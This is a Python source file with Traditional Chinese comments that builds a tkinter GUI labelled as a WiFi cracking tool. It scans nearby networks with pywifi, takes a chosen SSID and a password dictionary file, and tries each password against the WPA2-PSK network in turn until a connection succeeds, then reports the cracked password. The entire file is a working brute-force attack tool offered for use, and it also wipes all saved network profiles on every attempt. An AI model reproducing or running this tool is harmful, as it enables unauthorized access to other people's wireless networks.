# -*- coding: utf-8 -*-
from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
import time
import tkinter.filedialog  # 在 GUI 中開啟檔案瀏覽
import tkinter.messagebox  # 開啟 tkinter 的訊息提醒框

class MY_GUI():
    def __init__(self, init_window_name):
        self.init_window_name = init_window_name
        # 密碼檔案路徑
        self.get_value = StringVar()  # 設定可變內容
        # 取得破解 wifi 帳號
        self.get_wifi_value = StringVar()
        # 取得 wifi 密碼
        self.get_wifimm_value = StringVar()
        # 抓取網卡介面
        self.wifi = pywifi.PyWiFi()
        # 抓取第一個無線網卡
        self.iface = self.wifi.interfaces()[0]
        # 測試連線，斷開所有連線
        self.iface.disconnect()
        time.sleep(1)  # 休眠 1 秒
        # 測試網卡是否屬於斷開狀態
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def __str__(self):
        # 自動會呼叫的函式，返回自身的網卡
        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())
    
    # 設定視窗
    def set_init_window(self):
        self.init_window_name.title("WIFI 破解工具")
        self.init_window_name.geometry('+500+200')
        labelframe = LabelFrame(width=400, height=200, text="設定")  # 框架，以下物件都是對於 labelframe 中新增的
        labelframe.grid(column=0, row=0, padx=10, pady=10)
        self.search = Button(labelframe, text="搜尋附近 WiFi", command=self.scans_wifi_list).grid(column=0, row=0)
        self.pojie = Button(labelframe, text="開始破解", command=self.readPassWord).grid(column=1, row=0)
        self.label = Label(labelframe, text="目錄路徑：").grid(column=0, row=1)
        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)
        self.file = Button(labelframe, text="新增密碼檔案目錄", command=self.add_mm_file).grid(column=2, row=1)
        self.wifi_text = Label(labelframe, text="WiFi 帳號：").grid(column=0, row=2)
        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)
        self.wifi_mm_text = Label(labelframe, text="WiFi 密碼：").grid(column=2, row=2)
        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2, sticky=W)
        self.wifi_labelframe = LabelFrame(text="wifi 列表")
        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)
        # 定義樹形結構與捲軸
        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show="headings", columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)
        # 表格的標題
        self.wifi_tree.column("a", width=50, anchor="center")
        self.wifi_tree.column("b", width=100, anchor="center")
        self.wifi_tree.column("c", width=100, anchor="center")
        self.wifi_tree.column("d", width=100, anchor="center")
        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="signal")
        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)
        self.wifi_tree.bind("<Double-1>", self.onDBClick)
        self.vbar.grid(row=4, column=1, sticky=NS)

    # 搜尋 wifi
    def scans_wifi_list(self):  # 掃描周圍 wifi 列表
        # 開始掃描
        print("^_^ 開始掃描附近 wifi...")
        self.iface.scan()
        time.sleep(15)
        # 在若干秒後取得掃描結果
        scanres = self.iface.scan_results()
        # 統計附近被發現的熱點數量
        nums = len(scanres)
        print("數量: %s" % (nums))
        # 實際資料
        self.show_scans_wifi_list(scanres)
        return scanres
    
    # 顯示 wifi 列表
    def show_scans_wifi_list(self, scans_res):
        for index, wifi_info in enumerate(scans_res):
            self.wifi_tree.insert("", 'end', values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))

    # 新增密碼檔案目錄
    def add_mm_file(self):
        self.filename = tkinter.filedialog.askopenfilename()
        self.get_value.set(self.filename)

    # Treeview 繫結事件
    def onDBClick(self, event):
        self.sels = event.widget.selection()
        self.get_wifi_value.set(self.wifi_tree.item(self.sels, "values")[1])
    
    # 讀取密碼字典，進行配對
    def readPassWord(self):
        self.getFilePath = self.get_value.get()
        self.get_wifissid = self.get_wifi_value.get()
        pwdfilehander = open(self.getFilePath, "r", errors="ignore")
        while True:
            try:
                self.pwdStr = pwdfilehander.readline()
                if not self.pwdStr:
                    break
                self.pwdStr = self.pwdStr.strip()  # 移除換行符號及多餘空白
                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)
                if self.bool1:
                    self.res = "[*] 密碼正確！wifi 名：%s，配對密碼：%s " % (self.get_wifissid, self.pwdStr)
                    self.get_wifimm_value.set(self.pwdStr)
                    tkinter.messagebox.showinfo('提示', '破解成功！！！')
                    print(self.res)
                    break
                else:
                    self.res = "[*] 密碼錯誤！wifi 名:%s，配對密碼：%s" % (self.get_wifissid, self.pwdStr)
                    print(self.res)
                time.sleep(3)
            except:
                continue

    # 對 wifi 和密碼進行配對
    def connect(self, pwd_Str, wifi_ssid):
        # 建立 wifi 連線檔案
        self.profile = pywifi.Profile()
        self.profile.ssid = wifi_ssid  # wifi 名稱
        self.profile.auth = const.AUTH_ALG_OPEN  # 網卡的開放
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi 加密演算法
        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密單元
        self.profile.key = pwd_Str  # 密碼
        self.iface.remove_all_network_profiles()  # 刪除所有的 wifi 檔案
        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 設定新的連線檔案
        self.iface.connect(self.tmp_profile)  # 連線
        time.sleep(5)
        if self.iface.status() == const.IFACE_CONNECTED:  # 判斷是否連上
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()  # 斷開
        time.sleep(1)
        # 檢查斷開狀態
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK


def gui_start():
    init_window = Tk()
    ui = MY_GUI(init_window)
    print(ui)
    ui.set_init_window()
    init_window.mainloop()


if __name__ == "__main__":
    gui_start()